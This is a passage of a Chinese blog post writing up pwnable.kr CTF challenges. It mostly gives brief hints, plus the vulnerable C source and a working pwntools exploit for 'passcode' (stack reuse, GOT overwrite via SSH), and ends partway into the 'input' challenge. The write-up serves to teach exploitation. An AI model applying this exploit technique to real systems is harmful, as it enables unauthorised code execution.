<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>pwnable.kr first part - EP`s blog</title><meta name="Description" content="关于 LoveIt 主题"><meta property="og:title" content="pwnable.kr first part" />
<meta property="og:description" content="不想看毕设跑来摸鱼两天做完了第一部分，有些地方挺有意思的，但我忘了是哪些地方了&hellip;都简单写写吧 fd 0：标准输入；1：标准输出；2：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://linkleyping.top/pwnable_kr_1/" />
<meta property="og:image" content="https://linkleyping.top/logo.png"/>
<meta property="article:published_time" content="2021-11-03T15:48:51+08:00" />
<meta property="article:modified_time" content="2022-04-02T20:47:48+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://linkleyping.top/logo.png"/>

<meta name="twitter:title" content="pwnable.kr first part"/>
<meta name="twitter:description" content="不想看毕设跑来摸鱼两天做完了第一部分，有些地方挺有意思的，但我忘了是哪些地方了&hellip;都简单写写吧 fd 0：标准输入；1：标准输出；2："/>
<meta name="application-name" content="EP`s blog">
<meta name="apple-mobile-web-app-title" content="EP`s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://linkleyping.top/pwnable_kr_1/" /><link rel="prev" href="https://linkleyping.top/anywhere/" /><link rel="next" href="https://linkleyping.top/cve-2018-1160/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "pwnable.kr first part",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/linkleyping.top\/pwnable_kr_1\/"
        },"image": ["https:\/\/linkleyping.top\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  3553 ,
        "url": "https:\/\/linkleyping.top\/pwnable_kr_1\/","datePublished": "2021-11-03T15:48:51+08:00","dateModified": "2022-04-02T20:47:48+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "https:\/\/linkleyping.top\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "EP"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">  
    <div class="header-wrapper">  
        <div class="header-title">  
            <a href="/" title="EP`s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/icon.png"
        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
        data-sizes="auto"
        alt="/images/icon.png"
        title="/images/icon.png" />EP`s blog</a>  
        </div>  
        <div class="menu">  
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">  
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">  
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">  
                            <i class="fas fa-search fa-fw"></i>  
                        </a>  
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">  
                            <i class="fas fa-times-circle fa-fw"></i>  
                        </a>  
                        <span class="search-button search-loading" id="search-loading-desktop">  
                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
                        </span>  
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
                    <i class="fas fa-adjust fa-fw"></i>  
                </a>  
            </div>  
        </div>  
    </div>  
</header><header class="mobile" id="header-mobile">  
    <div class="header-container">  
        <div class="header-wrapper">  
            <div class="header-title">  
                <a href="/" title="EP`s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/icon.png"
        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
        data-sizes="auto"
        alt="/images/icon.png"
        title="/images/icon.png" />EP`s blog</a>  
            </div>  
            <div class="menu-toggle" id="menu-toggle-mobile">  
                <span></span><span></span><span></span>  
            </div>  
        </div>  
        <div class="menu" id="menu-mobile"><div class="search-wrapper">  
                    <div class="search mobile" id="search-mobile">  
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">  
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">  
                            <i class="fas fa-search fa-fw"></i>  
                        </a>  
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">  
                            <i class="fas fa-times-circle fa-fw"></i>  
                        </a>  
                        <span class="search-button search-loading" id="search-loading-mobile">  
                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
                        </span>  
                    </div>  
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">  
                        取消  
                    </a>  
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
                <i class="fas fa-adjust fa-fw"></i>  
            </a></div>  
    </div>  
</header>  
<div class="search-dropdown desktop">  
    <div id="search-dropdown-desktop"></div>  
</div>  
<div class="search-dropdown mobile">  
    <div id="search-dropdown-mobile"></div>  
</div>  
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">pwnable.kr first part</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://linkleyping.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>EP</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>writeup</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-03">2021-11-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3553 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#fd">fd</a></li>
    <li><a href="#collision">collision</a></li>
    <li><a href="#bof">bof</a></li>
    <li><a href="#flag">flag</a></li>
    <li><a href="#passcode">passcode</a></li>
    <li><a href="#random">random</a></li>
    <li><a href="#input">input</a></li>
    <li><a href="#leg">leg</a></li>
    <li><a href="#mistake">mistake</a></li>
    <li><a href="#shellshock">shellshock</a></li>
    <li><a href="#coin1">coin1</a></li>
    <li><a href="#blackjack">blackjack</a></li>
    <li><a href="#lotto">lotto</a></li>
    <li><a href="#cmd1">cmd1</a></li>
    <li><a href="#cmd2">cmd2</a></li>
    <li><a href="#uaf">uaf</a></li>
    <li><a href="#memcpy">memcpy</a></li>
    <li><a href="#asm">asm</a></li>
    <li><a href="#unlink">unlink</a></li>
    <li><a href="#blukat">blukat</a></li>
    <li><a href="#horcruxes">horcruxes</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>不想看毕设跑来摸鱼两天做完了第一部分，有些地方挺有意思的，但我忘了是哪些地方了&hellip;都简单写写吧</p>
<h2 id="fd">fd</h2>
<p>0：标准输入；1：标准输出；2：标准错误</p>
<h2 id="collision">collision</h2>
<p>略</p>
<h2 id="bof">bof</h2>
<p>栈溢出覆盖参数值</p>
<h2 id="flag">flag</h2>
<p>upx壳, <code>upx -d</code></p>
<h2 id="passcode">passcode</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
	<span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
	<span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>

	<span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span><span class="c1"></span>	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
     <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;checking...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;&amp;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Login OK!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Login Failed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

	<span class="n">welcome</span><span class="p">();</span>
	<span class="n">login</span><span class="p">();</span>

	<span class="c1">// something after login...
</span><span class="c1"></span>	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>直接运行简单输入的话会发生段错误。</p>
<p>仔细看<code>scanf</code>的两处，<code>scanf(&quot;%d&quot;, passcode1)</code>这句话会把输入的数字直接写入地址为<code>passcode1</code>的地方，而不是给<code>passcode1</code>赋值。</p>
<p><code>welcome</code>和<code>login</code>被连续调用，都没有参数，两者的<code>ebp</code>相同。在<code>welcome</code>中输入的<code>name</code>足够长的话，会被<code>login</code>的栈复用。因此可以控制<code>passcode1</code>的初始值，即可以发生任意地址写。可以将后面调用的<code>fflush</code>got表的地址修改成<code>system(&quot;/bin/cat flag&quot;)</code>这一行的地址。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;pwnable.kr&#39;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s1">&#39;passcode&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./passcode&#39;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x04\xa0\x04\x08</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;134514147&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="random">random</h2>
<p><code>random = rand()</code>的值固定</p>
<h2 id="input">input</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to pwnable.kr</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Let&#39;s see if you know how to give input to program</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Just give me correct inputs then you will get the flag :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

	<span class="c1">// argv
</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;A&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;B&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x20\x0a\x0d</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 1 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>	

	<span class="c1">// stdio
</span><span class="c1"></span>	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x00\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x02\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 2 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	
	<span class="c1">// env
</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">)))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 3 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

	<span class="c1">// file
</span><span class="c1"></span>	<span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x0a</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 4 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>	

	<span class="c1">// network
</span><span class="c1"></span>	<span class="kt">int</span> <span class="n">sd</span><span class="p">,</span> <span class="n">cd</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">caddr</span><span class="p">;</span>
	<span class="n">sd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">sd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;socket error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">])</span> <span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;bind error, use another port</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">listen</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
	<span class="n">cd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">cd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;accept error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span><span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 5 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

	<span class="c1">// here&#39;s your flag
</span><span class="c1"></span>	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>输入重定向、环境变量、socket通信等</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
